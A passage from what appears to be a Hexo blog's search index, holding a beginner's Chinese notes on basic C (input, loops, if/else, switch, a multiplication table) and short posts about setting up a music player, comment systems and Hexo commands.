class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效</span><br><span class="line">int x;// 这里是我定义了x</span><br><span class="line">int y;// 这里是我定义了y</span><br><span class="line">int wow()// 定义一个叫wow（）的进程</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; extern int x;// 借用外部定义好的x</span><br><span class="line">&nbsp; &nbsp; extern int y;// 借用外部定义好的y</span><br><span class="line">&nbsp; &nbsp; x = 1222;</span><br><span class="line">&nbsp; &nbsp; y = 1999;// 为x y赋值</span><br><span class="line">&nbsp; &nbsp; return x*y;// 程序的结果是输出x乘以y的数字</span><br><span class="line">}</span><br><span class="line">int main()// 主程序 不能缺少</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; int jieguo;</span><br><span class="line">&nbsp; &nbsp; jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果</span><br><span class="line">&nbsp; &nbsp; printf("你得到的结果是：%d",jieguo);//将输出的东西表示出来</span><br><span class="line">&nbsp; &nbsp; return 0;//结束程序</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你得到的结果是：2442778</span><br></pre></td></tr></tbody></table></figure><p>题外话：<br>printf（）中的%d指输出整数，实际显示的时候会被逗号后的结果所代替。</p><h3 id="（2）利用scanf-加入互动环节"><a href="#（2）利用scanf-加入互动环节" class="headerlink" title="（2）利用scanf()加入互动环节"></a>（2）利用scanf()加入互动环节</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效</span><br><span class="line">int x=0;// 这里是我定义了x</span><br><span class="line">int y=0;// 这里是我定义了y</span><br><span class="line">int wow()// 定义一个叫wow（）的进程</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; extern int x;// 借用外部定义好的x</span><br><span class="line">&nbsp; &nbsp; extern int y;// 借用外部定义好的y</span><br><span class="line">&nbsp; &nbsp; printf("请输入x值\n");</span><br><span class="line">&nbsp; &nbsp; scanf("%d",&amp;x);</span><br><span class="line">&nbsp; &nbsp; printf("请输入y值\n");</span><br><span class="line">&nbsp; &nbsp; scanf("%d",&amp;y);</span><br><span class="line">&nbsp; &nbsp; return x*y;// 程序的结果是输出x乘以y的数字</span><br><span class="line">}</span><br><span class="line">int main()// 主程序 不能缺少</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; int jieguo;</span><br><span class="line">&nbsp; &nbsp; jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果</span><br><span class="line">&nbsp; &nbsp; printf("你得到的结果是：%d",jieguo);//将输出的东西表示出来</span><br><span class="line">&nbsp; &nbsp; return 0;//结束程序</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请输入x值</span><br><span class="line">9</span><br><span class="line">请输入y值</span><br><span class="line">11</span><br><span class="line">你得到的结果是：99</span><br></pre></td></tr></tbody></table></figure><p>题外话：<br>scanf()中输入的东西是他所需要获取的 如加入逗号或者空格后不按照格式输入<br>理论来说会无法读取<br>\n代表换行<br>scanf(“%d, %d, %d”,&amp;a,&amp;b,&amp;c);  ←复合用法</p><h2 id="三-循环与if-else"><a href="#三-循环与if-else" class="headerlink" title="三.循环与if else"></a>三.循环与if else</h2><h3 id="（1）while"><a href="#（1）while" class="headerlink" title="（1）while"></a>（1）while</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; int i=0;</span><br><span class="line">&nbsp; &nbsp; while (i&lt;=100)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; i++;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("第%d",i);</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("次\n");</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第1次</span><br><span class="line">第2次</span><br><span class="line">第3次</span><br><span class="line">第4次</span><br><span class="line">第5次</span><br><span class="line">第6次</span><br><span class="line">第7次</span><br><span class="line">第8次</span><br><span class="line">第9次</span><br><span class="line">(中略)</span><br><span class="line">第101次</span><br></pre></td></tr></tbody></table></figure><p>说真的 c语言和python蛮像哈？<br>下表显示了 C 语言支持的所有算术运算符。假设变量&nbsp;<strong>A</strong>&nbsp;的值为 10，变量&nbsp;<strong>B</strong>&nbsp;的值为 20，则：</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>+</td><td>把两个操作数相加</td><td>A + B 将得到 30</td></tr><tr><td>-</td><td>从第一个操作数中减去第二个操作数</td><td>A - B 将得到 -10</td></tr><tr><td>*</td><td>把两个操作数相乘</td><td>A * B 将得到 200</td></tr><tr><td>/</td><td>分子除以分母</td><td>B / A 将得到 2</td></tr><tr><td>%</td><td>取模运算符，整除后的余数</td><td>B % A 将得到 0</td></tr><tr><td>++</td><td>自增运算符，整数值增加 1</td><td>A++ 将得到 11</td></tr><tr><td>–</td><td>自减运算符，整数值减少 1</td><td>A– 将得到 9</td></tr></tbody></table><h3 id="（2）if-else与switch-case"><a href="#（2）if-else与switch-case" class="headerlink" title="（2）if else与switch-case"></a>（2）if else与switch-case</h3><p>以下两种代码实现的是一种功能</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">&nbsp; &nbsp; int type=0;</span><br><span class="line">&nbsp; &nbsp; printf("请输入1-5以内的数字来获取回应\n");</span><br><span class="line">&nbsp; &nbsp; scanf("%d",&amp;type);</span><br><span class="line">&nbsp; &nbsp; if ( type==1 )</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("1");</span><br><span class="line">&nbsp; &nbsp; else if ( type==2 )</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("2");</span><br><span class="line">&nbsp; &nbsp; else if ( type==3 )</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("3");</span><br><span class="line">&nbsp; &nbsp; else if ( type==4 )</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("4");</span><br><span class="line">&nbsp; &nbsp; else if ( type==5 )</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("5");</span><br><span class="line">&nbsp; &nbsp; else</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("格式错误");</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">&nbsp; &nbsp; int type=0;</span><br><span class="line">&nbsp; &nbsp; printf("请输入1-5以内的数字来获取回应\n");</span><br><span class="line">&nbsp; &nbsp; scanf("%d",&amp;type);</span><br><span class="line">&nbsp; &nbsp; switch (type) {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; case 1:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; print("1");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; case 2:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("2");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; case 3:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("3");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; case 4:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("4");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; case 5:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("5");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; default:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("格式错误");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; }</span><br></pre></td></tr></tbody></table></figure><p>结论都是一样的</p><h2 id="四、while和do-while"><a href="#四、while和do-while" class="headerlink" title="四、while和do while"></a>四、while和do while</h2><h3 id="（1）while-1"><a href="#（1）while-1" class="headerlink" title="（1）while"></a>（1）while</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">&nbsp; &nbsp; int o=0;</span><br><span class="line">&nbsp; &nbsp; while ( o&lt;10)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; o++;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("%d",o);</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>简称来说就是当条件成立时 一直重复运行某物</p><p>输出：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td></tr></tbody></table></figure><h3 id="2-do-while"><a href="#2-do-while" class="headerlink" title="(2) do while"></a>(2) do while</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">&nbsp; &nbsp; int i=0;</span><br><span class="line">&nbsp; &nbsp; do</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; i++;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("%d",i);</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");</span><br><span class="line">&nbsp; &nbsp; } while ( i != 10);</span><br><span class="line">&nbsp; &nbsp; return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>while的换了个顺序版本<br>结果都是一样的就不放出来了</p><h2 id="五、整合一下先"><a href="#五、整合一下先" class="headerlink" title="五、整合一下先"></a>五、整合一下先</h2><h3 id="（1）比大小"><a href="#（1）比大小" class="headerlink" title="（1）比大小"></a>（1）比大小</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">&nbsp; &nbsp; int a,b,c,max;</span><br><span class="line">&nbsp; &nbsp; printf("请输入三个数字 以逗号隔开\n");</span><br><span class="line">&nbsp; &nbsp; scanf("%d,%d,%d",&amp;a,&amp;b,&amp;c);</span><br><span class="line">&nbsp; &nbsp; if(a&gt;b){ &nbsp;</span><br><span class="line">&nbsp; &nbsp; max = a;</span><br><span class="line">&nbsp; &nbsp; }else{</span><br><span class="line">&nbsp; &nbsp; max = b;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; if(c&gt;max){</span><br><span class="line">&nbsp; &nbsp; max = c;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; printf("max=%d", max);</span><br><span class="line">&nbsp; &nbsp; return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请输入三个数字 以逗号隔开</span><br><span class="line">3,1,6 </span><br><span class="line">max=6</span><br></pre></td></tr></tbody></table></figure><h3 id="（2）九九乘法表"><a href="#（2）九九乘法表" class="headerlink" title="（2）九九乘法表"></a>（2）九九乘法表</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; int n=9;</span><br><span class="line">&nbsp; &nbsp; int i,j;</span><br><span class="line">&nbsp; &nbsp; i=1;</span><br><span class="line">&nbsp; &nbsp; while (i&lt;=n)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; j=1;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; while (j&lt;=i)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("%d*%d=%d",j,i,j*i);</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((i*j&lt;10))</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp; ");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp;");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j++;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; i++;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1*1=1   </span><br><span class="line">1*2=2   2*2=4   </span><br><span class="line">1*3=3   2*3=6   3*3=9   </span><br><span class="line">1*4=4   2*4=8   3*4=12  4*4=16  </span><br><span class="line">1*5=5   2*5=10  3*5=15  4*5=20  5*5=25  </span><br><span class="line">1*6=6   2*6=12  3*6=18  4*6=24  5*6=30  6*6=36  </span><br><span class="line">1*7=7   2*7=14  3*7=21  4*7=28  5*7=35  6*7=42  7*7=49  </span><br><span class="line">1*8=8   2*8=16  3*8=24  4*8=32  5*8=40  6*8=48  7*8=56  8*8=64</span><br><span class="line">1*9=9   2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 学习 </tag>
+            
+            <tag> c </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于加入aplayer的方式</title>
+      <link href="/2023/07/05/%E5%85%B3%E4%BA%8E%E5%8A%A0%E5%85%A5aplayer%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
+      <url>/2023/07/05/%E5%85%B3%E4%BA%8E%E5%8A%A0%E5%85%A5aplayer%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>因为找到工作了所以更新会稍微有点摸<br>总之先来试一下网易云的html是否可以加入音乐播放</p><p>就很怪<br>网易云-生成外链播放器 再加上hexo中的md语法支持html自然可以成功<br>可是根据网上教程在主页左下角生成一个播放器的方式无法正常运行<br>下次再说吧</p></body></html>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>再来一次</title>
+      <link href="/2023/07/01/%E6%8E%A8%E5%80%92%E9%87%8D%E6%9D%A5/"/>
+      <url>/2023/07/01/%E6%8E%A8%E5%80%92%E9%87%8D%E6%9D%A5/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>简单来说<br>由于next旧版本与网上大部分教程无法对应<br>于是我决心直接更新推倒重来<br>网页恢复了最初始的样子<br>好消息是背景保留了</p></body></html>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 告示 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于在next7.8.0中建设评论功能这件事</title>
+      <link href="/2023/06/30/%E5%85%B3%E4%BA%8E%E5%9C%A8next7-8-0%E4%B8%AD%E5%BB%BA%E8%AE%BE%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD%E8%BF%99%E4%BB%B6%E4%BA%8B/"/>
+      <url>/2023/06/30/%E5%85%B3%E4%BA%8E%E5%9C%A8next7-8-0%E4%B8%AD%E5%BB%BA%E8%AE%BE%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD%E8%BF%99%E4%BB%B6%E4%BA%8B/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>于是乎今天忙了一整天尝试在网页中建设评论功能<br>next版本为7.8.0<br>这些是我的尝试过程和失败的结果  最终使用了畅言云评完成了此功能的测试 但还仍需改进<br>接下来是每个评论模块的分别介绍<br><b>如果要看具体配置过程可以去找我在文章中留下的网址 本人小白一个 不是太懂 谢谢</b></p><h2 id="valine与waline"><a href="#valine与waline" class="headerlink" title="valine与waline"></a>valine与waline</h2><p>waline由valine衍生而出</p><blockquote><p>Valine 特性</p></blockquote><ul><li>快速</li><li>安全</li><li>Emoji 😉</li><li>无后端实现</li><li>MarkDown 全语法支持</li><li>轻量易用(~15kb gzipped)</li><li>文章阅读量统计 v1.2.0+</li></ul><blockquote><p>Waline 与 Valine 最大的不同就是增加了服务端中间层，解决 Valine 暴露出来的安全问题。同时基于服务端的特性，提供了<strong>邮件通知</strong>、<strong>微信通知</strong>、<strong>评论后台管理</strong>、LeanCloud, MySQL, MongoDB, SQLite, PostgreSQL&nbsp;<strong>多存储服务支持</strong>等诸多特性。 —-<a href="https://zhuanlan.zhihu.com/p/295264916">摘自知乎</a></p></blockquote><p>我两个都试过了，valine方面参考了<a href="https://valine.js.org/">valine官方页面</a>  <a href="https://blog.csdn.net/wugenqiang/article/details/105744843">此教程</a><br>waline方面则是参考了<a href="https://waline.js.org/guide/deploy/vps.html">waline官方页面</a>  <a href="https://zhuanlan.zhihu.com/p/535607671">这个教程</a></p><p>首先是在尝试时踩的坑:<br>1.valine在部署时使用的leadcloud需使用国际版，否则将需要网站备案<br>2.next7.0+的版本不会内置valine的文件，需要自己下载valine.min.js并配置cdn<br>3.统计<strong>访问人数</strong>和<strong>访问总量</strong>的系统也是由valine支持,想要同时开启会报错</p><p>valine这边在全都按照流程过了一遍确认无误后却发现网页没有评论系统出现<br>只得作罢<br>waline由于next主题中的config.yml没有自带选项 需要复制粘贴<br>在确认过复制到的地区没问题的情况下 hexo s持续爆warning<br>只得作罢×2</p><p>害…过几天再试吧 都是泪啊</p><h2 id="gitalk"><a href="#gitalk" class="headerlink" title="gitalk"></a>gitalk</h2><blockquote><p>Gitalk 特性</p></blockquote><ul><li>使用 GitHub 登录</li><li>支持多语言 [en, zh-CN, zh-TW, es-ES, fr, ru]</li><li>支持个人或组织</li><li>无干扰模式（设置 distractionFreeMode 为 true 开启）</li><li>快捷键提交评论 （cmd|ctrl + enter）</li></ul><p>是github官方的评论功能<br>参考了<a href="https://www.jianshu.com/p/02fc71f3633f">这个教程</a></p><p>安装后本地配置显示<strong>network error</strong><br>hexo g hexo d后也是相同的问题<br>搜索后发现是由于github网络地区特殊无法获取端口导致</p><p>但目前没有具体的解决方式</p><h2 id="畅言云评"><a href="#畅言云评" class="headerlink" title="畅言云评"></a>畅言云评</h2><p><a href="https://blog.csdn.net/lcyaiym/article/details/76762074">参考了这个教程</a><br>安装很简单 注册很简单 配置也只要输入appid 和appkey<br>但是具体出来的效果不太行 等待后期优化吧</p></body></html>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 学习 </tag>
+            
+            <tag> hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>目前的进展</title>
+      <link href="/2023/06/29/%E7%9B%AE%E5%89%8D%E7%9A%84%E8%BF%9B%E5%B1%95/"/>
+      <url>/2023/06/29/%E7%9B%AE%E5%89%8D%E7%9A%84%E8%BF%9B%E5%B1%95/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>参考<code><a href="https://asdfv1929.github.io/2018/01/25/crash-cheat/">https://asdfv1929.github.io/2018/01/25/crash-cheat/</a></code>完成了标题特效<br>目前想做的玩意：<br>背景音乐播放<br>live2d看板娘<br>背景加上图片 亦或者动效<br>把介绍页摸完<br>完善尾注<br>剩下就是这网站因为铺设在外网<br>加载速度<b>超级慢</b></p></body></html>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 告示 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>编辑小提示</title>
+      <link href="/2023/06/28/%E7%BC%96%E8%BE%91%E5%B0%8F%E6%8F%90%E7%A4%BA/"/>
+      <url>/2023/06/28/%E7%BC%96%E8%BE%91%E5%B0%8F%E6%8F%90%E7%A4%BA/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所有hexo命令前加上npx<br>gitbash中的复制粘贴是ctrl+install shift+install<br>改完元素后记得<br><code>npx hexo clean<br>npx hexo g</code><br>本地测试效果用npx hexo s 随后用localhost:4000来连接<br>上传到网络是npx hexo d<br>接下来进一步升级网页<br>三部曲改为<br><code>hexo clean<br>hexo g<br>gulp<br>hexo d</code><br>来优化网页</p></body></html>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>创建个人主页！</title>
+      <link href="/2023/06/28/hello-world/"/>
+      <url>/2023/06/28/hello-world/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>没啥事干所以就创建了<br>这里多半会写课上的笔记<br>在hexo中遇到的技术难关<br>请多指教</p></body></html>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
 </search>
